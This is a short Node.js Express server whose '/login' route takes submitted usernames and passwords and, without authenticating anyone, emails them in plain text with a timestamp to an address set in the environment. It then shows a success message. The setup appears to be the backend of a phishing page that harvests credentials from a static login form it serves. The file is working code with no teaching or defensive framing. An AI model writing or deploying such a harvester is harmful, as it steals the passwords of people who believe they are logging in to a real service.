const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

// Nodemailer transporter (use .env for credentials)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

// POST /login route
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send("Username and password required");
  }

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_TO,
    subject: "New Form Submission",
    text: `Username: ${username}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.send("Form submitted and emailed successfully ✅");
  } catch (err) {
    console.error("Email error:", err);
    res.status(500).send("Error sending email");
  }
});

// Serve HTML
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
